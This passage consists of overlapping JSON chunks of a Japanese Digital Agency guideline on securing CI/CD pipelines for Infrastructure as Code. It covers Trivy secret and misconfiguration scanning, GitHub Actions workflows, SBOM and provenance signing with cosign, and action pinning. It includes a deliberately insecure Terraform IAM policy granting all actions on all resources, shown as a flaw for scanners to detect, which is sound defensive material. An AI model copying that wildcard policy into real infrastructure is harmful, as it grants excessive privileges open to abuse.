      "url": "https://www.digital.go.jp/assets/contents/node/basic_page/field_ref_resources/e2a06143-ed29-4f1d-9c31-0f06fca67afc/2aa40167/20250630_resources_standard_guidelines_technical_report_02.pdf"
    },
    {
      "chunk_id": "59fd4957d4756fe2870e7aa1be2c0060_c13",
      "doc_id": "59fd4957d4756fe2870e7aa1be2c0060",
      "chunk_index": 13,
      "text": "xit code: 1 hoge.txt (secrets) Total: 1 (UNKNOWN: 0, LOW: 0, MEDIUM: 0, HIGH: 0, CRITICAL: 1) CRITICAL: AWS (aws-access-key-id) ════════════════════════════════════════ AWS Access Key ID ──────────────────────────────────────── hoge.txt:1 ──────────────────────────────────────── 1 [ export SAMPLE_AWS_KEY=******************** 2 ──────────────────────────────────────── 図 20：Git フックとTrivy によるシークレット検知 ３.３ビルドフェーズの保護 1)シークレット情報の漏洩対策 図 21：シークレット情報の漏洩対策 本パイプラインでは、成果物のアップロードや、成果物等への署名にAWS の アクセスキーを必要としている。このアクセスキーの保護が必要である。具 体的には先の章にあったような平文で記載されたアクセスキーのアップロー ドと、ログへの出力である。 まず、平文アクセスキーのアップロードに対する対策では、ローカル環境 と同じくスキャンによる検出が有効である。先の例と同じく、Trivy を用いた スキャンをGitHub Actions のワークフローに組み込み、リポジトリ内に誤っ て含まれたシークレットを検出する（図 22） 。\n\n16 % cat .github/workflows/check.yml - name: Scan Secrets uses: aquasecurity/trivy-action@18f2510ee396bbf400402947b394f2dd8c87dbb0 env: TRIVY_DEBUG: 'true' with: scan-type: fs scanners: secret scan-ref: ./ format: table output: secret-scan-result.txt exit-code: 1 図 22：ビルド設定内で構成されたTrivy のシークレットスキャン この状態でAWS のアクセスキーを含む新規commit がリモートのリポジトリ にpush されると、図 23 のように検出され、エラーとして通知される。ただ し、既にpush 済みであるため、当該リポジトリの他アカウントが閲覧してい ることを想定し、安全のために該当キーを速やかにローテーションする必要 がある。 図 23：シークレット混入によるビルドフェーズの失敗と通知\n\n17 次に、ログへの出力である。マスキングが一般的な対策であり、本書で活 用するGitHub リポジトリ設定の「Secrets」はこの対策を備えている。",
      "page_from": 19,
      "page_to": 21,
      "char_count": 1277,
      "position": 13415,
      "meeting": "デジタル社会推進標準ガイドライン",
      "agency": "デジタル庁",
      "title": "別添. CI/CDパイプラインによるInfrastructure as Code実装例（PDF／4,825KB）",
      "date": "2025-06-30",
      "url": "https://www.digital.go.jp/assets/contents/node/basic_page/field_ref_resources/e2a06143-ed29-4f1d-9c31-0f06fca67afc/2aa40167/20250630_resources_standard_guidelines_technical_report_02.pdf"
    },
    {
      "chunk_id": "59fd4957d4756fe2870e7aa1be2c0060_c14",
      "doc_id": "59fd4957d4756fe2870e7aa1be2c0060",
      "chunk_index": 14,
      "text": "エラーとして通知される。ただ し、既にpush 済みであるため、当該リポジトリの他アカウントが閲覧してい ることを想定し、安全のために該当キーを速やかにローテーションする必要 がある。 図 23：シークレット混入によるビルドフェーズの失敗と通知\n\n17 次に、ログへの出力である。マスキングが一般的な対策であり、本書で活 用するGitHub リポジトリ設定の「Secrets」はこの対策を備えている。GitHub Actions 上のワークフローが何らかの理由によりアクセスキーを含めるログ出 力を実装してしまった場合、GitHub Actions が自動的に出力されたシークレ ットの内容を除外する 6。なお、長期的に有効なシークレットの利用には変わ らないため、有効期限が短い動的に生成する構成を使うことが本来は望まし い7。また、GitHub のログ以外の成果物に書き込んだ場合には、マスキング対 象としては認識されない。これらのことから、そもそもアクセスキーを含む ようなログ出力の実装をしないことを基本とすべきである。 図 24：GitHub リポジトリの「Secrets」設定 2)ソースコード・成果物の信頼性の担保 図 25：2)ソースコード・成果物の信頼性の担保 Terraform バイナリ及びTerraform プロバイダーを含むコンテナイメージの 信頼性を確保するにあたって、次の処理を実施する。なお、4「依存物の安全 性の確認」については後続の３.３4) 「依存物の安全性の担保」にて言及す る。 6 https://docs.github.com/en/actions/security-for-github-actions/security-guides/using-secrets-in-github- actions#using-secrets-in-a-workflow 7 https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your- deployments/configuring-openid-connect-in-amazon-web-services\n\n18 1. レビューの必須化 2. 構成ミスの検出 3. 脆弱性の検出 4. 依存物の安全性の確認 1「レビューの必須化」については、品質管理の強化のため、３.２2)「強 制的な取り込みの禁止」に加え、特定のメンバーによる承認を強制する。具 体的にはCode Owners 8（図 26）を指定し、 「branch rule」に「Require review from Code Owners」にチェックを入れることでCode Owners のレビュ ーを必須化している（図 27） 。また、承認人数を指定することも可能である。",
      "page_from": 20,
      "page_to": 22,
      "char_count": 1220,
      "position": 14492,
      "meeting": "デジタル社会推進標準ガイドライン",
      "agency": "デジタル庁",
      "title": "別添. CI/CDパイプラインによるInfrastructure as Code実装例（PDF／4,825KB）",
      "date": "2025-06-30",
      "url": "https://www.digital.go.jp/assets/contents/node/basic_page/field_ref_resources/e2a06143-ed29-4f1d-9c31-0f06fca67afc/2aa40167/20250630_resources_standard_guidelines_technical_report_02.pdf"
    },
    {
      "chunk_id": "59fd4957d4756fe2870e7aa1be2c0060_c15",
      "doc_id": "59fd4957d4756fe2870e7aa1be2c0060",
      "chunk_index": 15,
      "text": "ては、品質管理の強化のため、３.２2)「強 制的な取り込みの禁止」に加え、特定のメンバーによる承認を強制する。具 体的にはCode Owners 8（図 26）を指定し、 「branch rule」に「Require review from Code Owners」にチェックを入れることでCode Owners のレビュ ーを必須化している（図 27） 。また、承認人数を指定することも可能である。 % cat .github/CODEOWNERS * @xxxxx 図 26：code owner の指定 図 27：branch rule における承認関連の設定 2「構成ミスの検出」と3「脆弱性の検出」は、Trivy によるスキャンを活用 8 https://docs.github.com/en/repositories/managing-your-repositorys-settings-and-features/customizing- your-repository/about-code-owners\n\n19 する（図 28） 。なお、構成ミスのスキャン対象はコンテナイメージを生成す るコマンドライン命令を記述したDockerfile、脆弱性のスキャン対象はコン テナイメージとなる。 % cat .github/workflows/check.yml jobs: check-vuln: name: Check Vulnerability (MEDIUM,HIGH,CRITICAL) runs-on: ubuntu-24.04 steps: （中略） - name: Scan Vulnerability uses: aquasecurity/trivy-action@18f2510ee396bbf400402947b394f2dd8c87dbb0 with: scan-type: image scanners: vuln image-ref: tmp/tf-image:latest exit-code: 1 severity: MEDIUM,HIGH,CRITICAL output: vuln-result.txt （中略） check-misconfig: name: Check Misconfiguration (MEDIUM,HIGH,CRITICAL) runs-on: ubuntu-24.04 steps: - name: Checkout repository uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364 - name: Check Misconfiguration uses: aquasecurity/trivy-action@18f2510ee396bbf400402947",
      "page_from": 22,
      "page_to": 23,
      "char_count": 1200,
      "position": 15512,
      "meeting": "デジタル社会推進標準ガイドライン",
      "agency": "デジタル庁",
      "title": "別添. CI/CDパイプラインによるInfrastructure as Code実装例（PDF／4,825KB）",
      "date": "2025-06-30",
      "url": "https://www.digital.go.jp/assets/contents/node/basic_page/field_ref_resources/e2a06143-ed29-4f1d-9c31-0f06fca67afc/2aa40167/20250630_resources_standard_guidelines_technical_report_02.pdf"
    },
    {
      "chunk_id": "59fd4957d4756fe2870e7aa1be2c0060_c16",
      "doc_id": "59fd4957d4756fe2870e7aa1be2c0060",
      "chunk_index": 16,
      "text": "uns-on: ubuntu-24.04 steps: - name: Checkout repository uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364 - name: Check Misconfiguration uses: aquasecurity/trivy-action@18f2510ee396bbf400402947 with: scan-type: config scanners: dockerfile format: table scan-ref: ./ severity: MEDIUM,HIGH,CRITICAL exit-code: 1 output: misconfig-result.txt （中略） 図 28：Trivy による構成ミスの検出 スキャンの出力結果を 図 29 および図 30 に示している。構成ミスは Critical, High, Middle の範囲では検出されなかったが、Terraform バイナ リにはCritical およびHigh とされた脆弱性が各1 件ずつ検出されている。 また、ベースイメージでもMiddle レベルの脆弱性が数件確認できる。ただし、 このTerraform バイナリ自体はTerraform の開発元であるHashiCorp 公式が 提供するDebian パッケージとなっている一方で、Trivy はUbuntu（OS）の脆 弱性情報をUbuntu CVE Tracker9から参照している。一定の非パッケージ化さ れたソフトウェアにも対応しているものの10、Trivyによる脆弱性結果におけ る偽陽性・偽陰性の可能性は考慮すべきである。なお、これはTrivy に限定 された制限ではなく、脆弱性スキャナーにおいて共通した制限である。 9 https://ubuntu.com/security/cves 10 https://trivy.dev/v0.55/docs/scanner/vulnerability/#non-packaged-software\n\n20 図 29：脆弱性混入によるビルドの失敗と通知 図 30：混入した脆弱性の一覧\n\n21 先述した脆弱性による影響を直ちに受けるとは言い切れないが、パイプライ ンA の成果物は複数のサービスチームが共通して利用する。そのため、プラッ トフォームチームはサプライヤーとして、サービスチームが安全に成果物を取 得できることに加え、最終的な利用可否を判断できるよう、該当脆弱性に関す る情報提供をすることが望ましい場合もある。そこで成果物のコンテナイメー ジへの署名に加え、成果物に関するメタデータ 11も作成・提供する。",
      "page_from": 23,
      "page_to": 25,
      "char_count": 1168,
      "position": 16512,
      "meeting": "デジタル社会推進標準ガイドライン",
      "agency": "デジタル庁",
      "title": "別添. CI/CDパイプラインによるInfrastructure as Code実装例（PDF／4,825KB）",
      "date": "2025-06-30",
      "url": "https://www.digital.go.jp/assets/contents/node/basic_page/field_ref_resources/e2a06143-ed29-4f1d-9c31-0f06fca67afc/2aa40167/20250630_resources_standard_guidelines_technical_report_02.pdf"
    },
    {
      "chunk_id": "59fd4957d4756fe2870e7aa1be2c0060_c17",
      "doc_id": "59fd4957d4756fe2870e7aa1be2c0060",
      "chunk_index": 17,
      "text": "直ちに受けるとは言い切れないが、パイプライ ンA の成果物は複数のサービスチームが共通して利用する。そのため、プラッ トフォームチームはサプライヤーとして、サービスチームが安全に成果物を取 得できることに加え、最終的な利用可否を判断できるよう、該当脆弱性に関す る情報提供をすることが望ましい場合もある。そこで成果物のコンテナイメー ジへの署名に加え、成果物に関するメタデータ 11も作成・提供する。具体的に は、ソフトウェア・コンポジション解析（SCA）の一部であるSBOM ファイル、 および成果物の来歴（いつ・どこで・どのように生成されたか）を示す provenance ファイルを作成し、これらにも署名を行った上でアーティファクト リポジトリへアップロードする。 まずは、コンテナイメージを生成する。 % cat .github/workflows/build.yml jobs: build-and-deliver: runs-on: ubuntu-latest env: PREDICATE_FILE: predicate.json steps: (中略) - name: Configure AWS Credentials uses: aws-actions/configure-aws- credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502 with: aws-access-key-id: ${{ secrets.AWS_ACCESS_KEY_ID }} aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS_KEY }} aws-region: ap-northeast-1 - name: Login to Amazon ECR id: login-ecr uses: aws-actions/amazon-ecr-login@062b18b96a7aff071d4dc91bc00c4c1a7945b076 - name: Build and Deliver uses: docker/build-push-action@48aba3b46d1b1fec4febb7c5d0c644b249a11355 id: docker-build-and-push with: context: . push: true build-args: | TF_VERSION=${{ env.DEFAULT_TF_VERSION }} UBUNTU_VERSION=${{ env.DEFAULT_UBUNTU_VERSION }} tags: ${{ steps.login-ecr.outputs.registry }}/tf- image:ubuntu.${{ env.DEFAU",
      "page_from": 25,
      "page_to": 25,
      "char_count": 1200,
      "position": 17480,
      "meeting": "デジタル社会推進標準ガイドライン",
      "agency": "デジタル庁",
      "title": "別添. CI/CDパイプラインによるInfrastructure as Code実装例（PDF／4,825KB）",
      "date": "2025-06-30",
      "url": "https://www.digital.go.jp/assets/contents/node/basic_page/field_ref_resources/e2a06143-ed29-4f1d-9c31-0f06fca67afc/2aa40167/20250630_resources_standard_guidelines_technical_report_02.pdf"
    },
    {
      "chunk_id": "59fd4957d4756fe2870e7aa1be2c0060_c18",
      "doc_id": "59fd4957d4756fe2870e7aa1be2c0060",
      "chunk_index": 18,
      "text": "ntext: . push: true build-args: | TF_VERSION=${{ env.DEFAULT_TF_VERSION }} UBUNTU_VERSION=${{ env.DEFAULT_UBUNTU_VERSION }} tags: ${{ steps.login-ecr.outputs.registry }}/tf- image:ubuntu.${{ env.DEFAULT_UBUNTU_VERSION }}- tf.${{ env.DEFAULT_TF_VERSION }},${{ steps.login-ecr.outputs.registry }}/tf- image:${{ env.DEFAULT_TF_VERSION }},${{ steps.login-ecr.outputs.registry }}/tf- image:latest labels: ${{ steps.meta.outputs.labels }} platforms: linux/arm64 provenance: false no-cache: ${{ inputs.no-cache == true }} cache-from: type=gha cache-to: type=gha,mode=max - name: Set IMAGE_DIGEST id: set-image-digest run: | echo \"IMAGE_DIGEST=${{ steps.login-ecr.outputs.registry }}/tf- image@${{ steps.docker-build-and-push.outputs.digest }}\" >> $GITHUB_OUTPUT 11 Predicate という。predicate は、アーティファクトに関連付けられたメタデータで、JSON オブジェクトとして保存 される。ソフトウェア・サプライチェーンの完全性を保護することを目的としたin-toto が精査したPredicate の種類 には、本章で紹介するSLSA Provenance やSPDX/CycloneDX といったSBOM 以外にもある。\n\n22 図 31：コンテナイメージの生成とECR（アーティファクトリポジトリ）へのアップロード 図 32：アップロードされたコンテナイメージ 生成したコンテナイメージのSBOM ファイルとProvenance ファイル をそれ ぞれ、Trivy とSLSA Framework のツールで生成している。 % cat .github/workflows/build.yml jobs: build-and-deliver: runs-on: ubuntu-latest env: PREDICATE_FILE:",
      "page_from": 25,
      "page_to": 26,
      "char_count": 1200,
      "position": 18480,
      "meeting": "デジタル社会推進標準ガイドライン",
      "agency": "デジタル庁",
      "title": "別添. CI/CDパイプラインによるInfrastructure as Code実装例（PDF／4,825KB）",
      "date": "2025-06-30",
      "url": "https://www.digital.go.jp/assets/contents/node/basic_page/field_ref_resources/e2a06143-ed29-4f1d-9c31-0f06fca67afc/2aa40167/20250630_resources_standard_guidelines_technical_report_02.pdf"
    },
    {
      "chunk_id": "59fd4957d4756fe2870e7aa1be2c0060_c19",
      "doc_id": "59fd4957d4756fe2870e7aa1be2c0060",
      "chunk_index": 19,
      "text": "ップロードされたコンテナイメージ 生成したコンテナイメージのSBOM ファイルとProvenance ファイル をそれ ぞれ、Trivy とSLSA Framework のツールで生成している。 % cat .github/workflows/build.yml jobs: build-and-deliver: runs-on: ubuntu-latest env: PREDICATE_FILE: predicate.json steps: (中略) - name: Generate a SBOM run: | trivy image --scanners vuln --format spdx-json -o ./tmp/tf-sbom.spdx.json ${{ steps.set-image-digest.outputs.IMAGE_DIGEST }} trivy image --scanners vuln --format cyclonedx -o ./tmp/tf-sbom.cdx.json ${{ steps.set-image-digest.outputs.IMAGE_DIGEST }} aws s3 cp ./tmp/tf-sbom.spdx.json s3://test-sbom-artifacts/ aws s3 cp ./tmp/tf-sbom.cdx.json s3://test-sbom-artifacts/ - name: Generate a provenance id: sign-prov env: UNTRUSTED_IMAGE: \"${{ steps.login-ecr.outputs.registry }}/tf-image\" UNTRUSTED_DIGEST: ${{ steps.docker-build-and-push.outputs.digest }} GITHUB_CONTEXT: \"${{ toJSON(github) }}\" VARS_CONTEXT: \"${{ toJSON(vars) }}\" run: | set -euo pipefail # Generate a predicate only. ./slsa-generator-container-linux-amd64 generate -- predicate=\"${{ env.PREDICATE_FILE }}\" aws s3 cp ${{ env.PREDICATE_FILE }} s3://test-sbom-artifacts/ cat ${{ env.PREDICATE_FILE }} | jq . 図 33：ビルド設定内で構成されたPredicate（SLSA、Provenance）の生成 そして、cosign というツールを利用し、コンテナイメージそのもの、メタ データ（SBOM ファイル、Provenance ファイル）に対して署名し、ECR にアッ\n\n23 プロードしている。",
      "page_from": 26,
      "page_to": 27,
      "char_count": 1274,
      "position": 19480,
      "meeting": "デジタル社会推進標準ガイドライン",
      "agency": "デジタル庁",
      "title": "別添. CI/CDパイプラインによるInfrastructure as Code実装例（PDF／4,825KB）",
      "date": "2025-06-30",
      "url": "https://www.digital.go.jp/assets/contents/node/basic_page/field_ref_resources/e2a06143-ed29-4f1d-9c31-0f06fca67afc/2aa40167/20250630_resources_standard_guidelines_technical_report_02.pdf"
    },
    {
      "chunk_id": "59fd4957d4756fe2870e7aa1be2c0060_c20",
      "doc_id": "59fd4957d4756fe2870e7aa1be2c0060",
      "chunk_index": 20,
      "text": "st-sbom-artifacts/ cat ${{ env.PREDICATE_FILE }} | jq . 図 33：ビルド設定内で構成されたPredicate（SLSA、Provenance）の生成 そして、cosign というツールを利用し、コンテナイメージそのもの、メタ データ（SBOM ファイル、Provenance ファイル）に対して署名し、ECR にアッ\n\n23 プロードしている。 % cat .github/workflows/build.yml jobs: build-and-deliver: runs-on: ubuntu-latest env: PREDICATE_FILE: predicate.json steps: (中略) - name: Configure AWS Credentials uses: aws-actions/configure-aws- credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502 with: aws-access-key-id: ${{ secrets.AWS_ACCESS_KEY_ID }} aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS_KEY }} aws-region: ap-northeast-1 - name: Login to Amazon ECR id: login-ecr uses: aws-actions/amazon-ecr-login@062b18b96a7aff071d4dc91bc00c4c1a7945b076 (中略) - name: Sign and Upload Image run: | cosign sign ${{ steps.set-image-digest.outputs.IMAGE_DIGEST }} --yes --tlog- upload=false --key \"awskms:///${{ env.AWS_CMK_ID }}\" - name: Attest Provenance and SBOM and Upload Attestation run: | IMAGE_DIGEST=\"${{ steps.login-ecr.outputs.registry }}/tf- image@${{ steps.docker-build-and-push.outputs.digest }}\" echo \"Attest and Upload Provenance (SLSA)\" cosign attest --predicate=\"${{ env.PREDICATE_FILE }}\" $IMAGE_DIGEST \\ --yes \\ --tlog-upload",
      "page_from": 26,
      "page_to": 27,
      "char_count": 1200,
      "position": 20554,
      "meeting": "デジタル社会推進標準ガイドライン",
      "agency": "デジタル庁",
      "title": "別添. CI/CDパイプラインによるInfrastructure as Code実装例（PDF／4,825KB）",
      "date": "2025-06-30",
      "url": "https://www.digital.go.jp/assets/contents/node/basic_page/field_ref_resources/e2a06143-ed29-4f1d-9c31-0f06fca67afc/2aa40167/20250630_resources_standard_guidelines_technical_report_02.pdf"
    },
    {
      "chunk_id": "59fd4957d4756fe2870e7aa1be2c0060_c21",
      "doc_id": "59fd4957d4756fe2870e7aa1be2c0060",
      "chunk_index": 21,
      "text": "y }}/tf- image@${{ steps.docker-build-and-push.outputs.digest }}\" echo \"Attest and Upload Provenance (SLSA)\" cosign attest --predicate=\"${{ env.PREDICATE_FILE }}\" $IMAGE_DIGEST \\ --yes \\ --tlog-upload=false \\ --type slsaprovenance \\ --key \"awskms:///${{ env.AWS_CMK_ID }}\" echo \"Attest and Upload SBOM\" cosign attest --predicate=\"./tmp/tf-sbom.cdx.json\" $IMAGE_DIGEST \\ --yes \\ --tlog-upload=false \\ --type cyclonedx \\ --key \"awskms:///${{ env.AWS_CMK_ID }}\" cosign attest --predicate=\"./tmp/tf-sbom.spdx.json\" $IMAGE_DIGEST \\ --yes \\ --tlog-upload=false \\ --type spdx \\ --key \"awskms:///${{ env.AWS_CMK_ID }}\" 図 34：ビルド設定内で構成されたcosign による成果物およびメタデータの署名とアップ ロード 図 35：アーティファクトリポジトリとしてのECR\n\n24 3)ビルド上での実行範囲の制限 図 36：ビルド上での実行範囲の制限 ３.２2) 「ソースコード管理システム、そのリポジトリ及びブランチの保 護」の「CI/CD パイプライン定義ファイルの保護」で「push rulesets」を構 成しているため、特定のメンバー以外はビルド定義ファイルを更新できない 状態となっている。また、利用しているツールやソフトウェアは信頼できる 第三者の組織（例: AWS, GitHub, The Linux Foundation, Docker, Aqua Security、HashiCorp、Canonical Ltd）管理下のもののみを利用しているため、 暗黙的に信頼してもリスクは低い状態となっている。これら２つの対策によ り、不正なツールの混入リスクを緩和できる。加えて、ビルドフェーズは、 実稼働環境の変更に影響はない。そのため、権限という観点からも実行範囲 の制限を課すことができる。 4)依存物の安全性の担保 図 37：依存物の安全性の担保 依存物の安全性の担保としては、依存物のソフトウェア資産としての管理、\n\n25 脆弱性管理、そして依存物の完全性・真正性等の確認が考えられる。",
      "page_from": 27,
      "page_to": 29,
      "char_count": 1205,
      "position": 21554,
      "meeting": "デジタル社会推進標準ガイドライン",
      "agency": "デジタル庁",
      "title": "別添. CI/CDパイプラインによるInfrastructure as Code実装例（PDF／4,825KB）",
      "date": "2025-06-30",
      "url": "https://www.digital.go.jp/assets/contents/node/basic_page/field_ref_resources/e2a06143-ed29-4f1d-9c31-0f06fca67afc/2aa40167/20250630_resources_standard_guidelines_technical_report_02.pdf"
    },
    {
      "chunk_id": "59fd4957d4756fe2870e7aa1be2c0060_c22",
      "doc_id": "59fd4957d4756fe2870e7aa1be2c0060",
      "chunk_index": 22,
      "text": "なっている。これら２つの対策によ り、不正なツールの混入リスクを緩和できる。加えて、ビルドフェーズは、 実稼働環境の変更に影響はない。そのため、権限という観点からも実行範囲 の制限を課すことができる。 4)依存物の安全性の担保 図 37：依存物の安全性の担保 依存物の安全性の担保としては、依存物のソフトウェア資産としての管理、\n\n25 脆弱性管理、そして依存物の完全性・真正性等の確認が考えられる。依存物の ソフトウェア資産としての管理および脆弱性の可視化は、３.３2)「ソースコ ード・成果物の信頼性の担保」にて行い、依存物の完全性・真正性については、 ３.３3)「ビルド上での実行範囲の制限」で言及した。 GitHub Actions 内で使用する外部モジュールアクション（action）も依存 物となる。これについても完全性と真正性を確保する必要がある。例えば図 38 に示す「actions/checkout」は、リポジトリ内の作業ツリーを切り替える 外部アクションであり、その「@v4」はリリースタグ（Git タグ）を示す。し かし、タグの指し示す先は変更される可能性があり、不変とは限らない。意 図しない変更が発生しないよう、公式配布元からcommit hash を取得して指 定することで、GitHub Actions のアクションの完全性・真正性を確保しやす くなる。1213 % cat .github/workflows/build.yml jobs: build-and-deliver: （中略） steps: - name: Checkout # uses: actions/checkout@v4 uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 図 38：デリバリ（ビルド）設定内で記述された依存Action のcommit hash 指定 ただし、TrivyやCosignといった成果物に含まれない依存ツールについて、 それらの安全性確保の取り組みを、成果物利用者であるサービスチームに伝 達する何等かの仕組みは必要になる可能性がある。 5)ストレージ内の成果物の保護 図 39：ストレージ内の成果物の保護 12 2024/10 でcommit hash 以外による不変性を確保するImmutable Actions がpublic preview となった。 https://github.com/features/preview/immutable-actions 13依存物バージョン管理ツールであるDependabot はcommit hash からもバージョンを照合することができる\n\n26 ECR のリソースポリシーやKMS のキーポリシーの設定となるが、これらは CI/CD パイプライン特有の事項ではないため、省略する。",
      "page_from": 28,
      "page_to": 30,
      "char_count": 1224,
      "position": 22559,
      "meeting": "デジタル社会推進標準ガイドライン",
      "agency": "デジタル庁",
      "title": "別添. CI/CDパイプラインによるInfrastructure as Code実装例（PDF／4,825KB）",
      "date": "2025-06-30",
      "url": "https://www.digital.go.jp/assets/contents/node/basic_page/field_ref_resources/e2a06143-ed29-4f1d-9c31-0f06fca67afc/2aa40167/20250630_resources_standard_guidelines_technical_report_02.pdf"
    },
    {
      "chunk_id": "59fd4957d4756fe2870e7aa1be2c0060_c23",
      "doc_id": "59fd4957d4756fe2870e7aa1be2c0060",
      "chunk_index": 23,
      "text": "review となった。 https://github.com/features/preview/immutable-actions 13依存物バージョン管理ツールであるDependabot はcommit hash からもバージョンを照合することができる\n\n26 ECR のリソースポリシーやKMS のキーポリシーの設定となるが、これらは CI/CD パイプライン特有の事項ではないため、省略する。 ３.４デリバリフェーズの保護 図 40：デリバリフェーズの保護 1)デリバリ時に利用する主体の保護 ３.３1)「シークレット情報の漏洩対策」等で触れているため、ここでは省 略する。 2)信頼できる成果物をデリバリするための保護 プラットフォームチームのチーム構成および少人数規模であることから、 本パイプラインではビルドとデリバリを同一の流れとした。そのため、保護 策は３.３「ビルドフェーズの保護」と同一となる。 3)デリバリ時の証跡 デリバリの証跡は、成果物としてはECR 上だけでなく、ソースコードのZip ファイルとしてGitHub 上に保管される。作業ログとしてはGitHub Actions の ワークフロー履歴がやはりGitHub 上に保管されている。また、AWS 上の Cloudtrail におけるデータイベントを有効にすれば、ECR への操作も記録され る。 以上がパイプラインA の概説である。\n\n27 ４サービスチームのCI/CDパイプライン サービスチームは、AWS リソースの構成をTerraform ファイルに定義し管理 する。これを自動化するのがサービスチームのCI/CD パイプライン（以下「パ イプラインB」 ）である。パイプラインB は、パイプラインA の成果物である コンテナイメージとAWS の各種シークレットを用いて、Terraform ファイルの 内容をAWS に反映する。リポジトリのブランチ構成としては、サービスチーム が開発・検証を行うdev ブランチと、最終的なリリースを行うmain ブランチ という簡潔なフローとする。 図 41：サービスチームのCI/CD パイプライン ４.１全フェーズに共通した保護 全フェーズに共通した保護については、 「資産管理」 「脆弱性管理を含む運 用・保守」 「環境への対策」 「ログの取得・管理」がある。このうち次に取り 上げていないものは、CI/CD パイプライン特有の事項ではないため省略する。 1)資産管理、脆弱性管理を含む・運用保守 サービスチームは、自身のコードパイプラインで扱うリソースに加え、依 存物であるプラットフォームチームの成果物も運用保守の対象とする必要が ある。具体的な対応策については、４.３4)「 依存物の安全性の担保」で解 説する。\n\n28 図 42：資産管理、脆弱性管理を含む・運用保守 2)シークレットの保護 パイプラインB では管理者が意識すべきシークレットはない。この仕組みに ついては、４.３3)「ビルド上での実行範囲の制限」にて解説する。",
      "page_from": 29,
      "page_to": 32,
      "char_count": 1286,
      "position": 23583,
      "meeting": "デジタル社会推進標準ガイドライン",
      "agency": "デジタル庁",
      "title": "別添. CI/CDパイプラインによるInfrastructure as Code実装例（PDF／4,825KB）",
      "date": "2025-06-30",
      "url": "https://www.digital.go.jp/assets/contents/node/basic_page/field_ref_resources/e2a06143-ed29-4f1d-9c31-0f06fca67afc/2aa40167/20250630_resources_standard_guidelines_technical_report_02.pdf"
    },
    {
      "chunk_id": "59fd4957d4756fe2870e7aa1be2c0060_c24",
      "doc_id": "59fd4957d4756fe2870e7aa1be2c0060",
      "chunk_index": 24,
      "text": "インで扱うリソースに加え、依 存物であるプラットフォームチームの成果物も運用保守の対象とする必要が ある。具体的な対応策については、４.３4)「 依存物の安全性の担保」で解 説する。\n\n28 図 42：資産管理、脆弱性管理を含む・運用保守 2)シークレットの保護 パイプラインB では管理者が意識すべきシークレットはない。この仕組みに ついては、４.３3)「ビルド上での実行範囲の制限」にて解説する。 3)CI/CD パイプラインを通した信頼性の確保 単純化のため、パイプラインB でもサービスチームの管理者がソースコード からデリバリまでを管理する。そのため、各パイプラインのフェーズでチー ムの差が発生せず、ある程度の信頼性がチーム構成によって担保される。 ４.２ローカル開発フェーズの保護 図 43：ローカル開発フェーズの保護 ブランチの運用に差はあるが、基本的にはパイプラインA と類似する設定に なるため、省略する。\n\n29 ４.３ビルドフェーズの保護 1)シークレット情報の漏洩対策 パイプラインB 特有の事項はないため、省略する。 2)ソースコード・成果物の信頼性の担保 図 44：ソースコード・成果物の信頼性の担保 パイプラインB のソースコードはTerraform ファイルであり、成果物は Terraform Plan（Tfplan）となる。Tfplan は現状の構成から変更される内容 を記述したファイルである。また、Tfplan はデリバリ時の入力値になるので、 脆弱性、特に本シナリオの場合は構成不備の混入を避けなければならない。 例えば権限設定（CWE-266: Incorrect Privilege Assignment）のような構成 不備を本シナリオで実装した場合、次のようなセグメント内のすべてを置換 する＊（アスタリスク）を指定したIAM ポリシーやリソースポリシーの記述が 考えられる。 % cat sample.tf resource \"aws_iam_role_policy\" \"sample\" { name = \"ex-iam-role-policy\" role = aws_iam_role.sample.id policy = jsonencode({ Version = \"2012-10-17\", Statement = [ { Effect = \"Allow\", Action = \"*\", Resource = \"*\" } ] }) } 図 45：構成不備の混入\n\n30 こういった構成不備をTrivy で検出することができる。14 % cat .github/workflows/tf-plan.tf jobs: （中略） check-misconfig: name: SAST (misconfig) runs-on: ubuntu-la",
      "page_from": 31,
      "page_to": 34,
      "char_count": 1200,
      "position": 24669,
      "meeting": "デジタル社会推進標準ガイドライン",
      "agency": "デジタル庁",
      "title": "別添. CI/CDパイプラインによるInfrastructure as Code実装例（PDF／4,825KB）",
      "date": "2025-06-30",
      "url": "https://www.digital.go.jp/assets/contents/node/basic_page/field_ref_resources/e2a06143-ed29-4f1d-9c31-0f06fca67afc/2aa40167/20250630_resources_standard_guidelines_technical_report_02.pdf"
    },
    {
      "chunk_id": "59fd4957d4756fe2870e7aa1be2c0060_c25",
      "doc_id": "59fd4957d4756fe2870e7aa1be2c0060",
      "chunk_index": 25,
      "text": "\"Allow\", Action = \"*\", Resource = \"*\" } ] }) } 図 45：構成不備の混入\n\n30 こういった構成不備をTrivy で検出することができる。14 % cat .github/workflows/tf-plan.tf jobs: （中略） check-misconfig: name: SAST (misconfig) runs-on: ubuntu-latest permissions: contents: read pull-requests: write steps: - name: Checkout repository uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 - name: trivy uses: aquasecurity/trivy-action@18f2510ee396bbf400402947b394f2dd8c87dbb0 env: TRIVY_DEBUG: 'true' with: version: v0.55.1 scan-type: config scanners: terraform,terraformplan-json,terraformplan-snapshot severity: 'CRITICAL,HIGH' scan-ref: ./ format: table output: misconfig-result.txt exit-code: 1 図 46：ビルド設定内で構成されたTrivy の構成不備スキャン この状態で、構成不備の実装を含むPR が作成された際は、次の様にエラー となる。 図 47：構成不備によるビルドフェーズの失敗と通知 14 なお、検証したtrivy はv0.56 であり、執筆時点で最新のv0.58 とは挙動が代わり、当該ルールはdepreacted とな っているhttps://github.com/aquasecurity/trivy/discussions/7878\n\n31 図 48：混入した構成不備の内容通知 構成不備に加え、プラットフォームチームが用意したAWS プロバイダー以外 の未許可であるプロバイダーの利用やモジュールの追加も、信頼性を損なう 要員である。こういったリスクからの保護策として、リポジトリのアクセス 権限の設定や、ビルドを必要とするブランチへのレビューのRulesets による 強制などが考えられる。\n\n32 3)ビルド上での実行範囲の制限 図 49：ビルド上での実行範囲の制限 CI 定義ファイルの保護方法および権限の最小化については、パイプラインA と同様のため、ここでは省略する。 パイプラインB のビルドフェーズでは、成果物のビルド、テスト、メタデー タ生成取得、署名検証などのために多種多様なツールを用いる。",
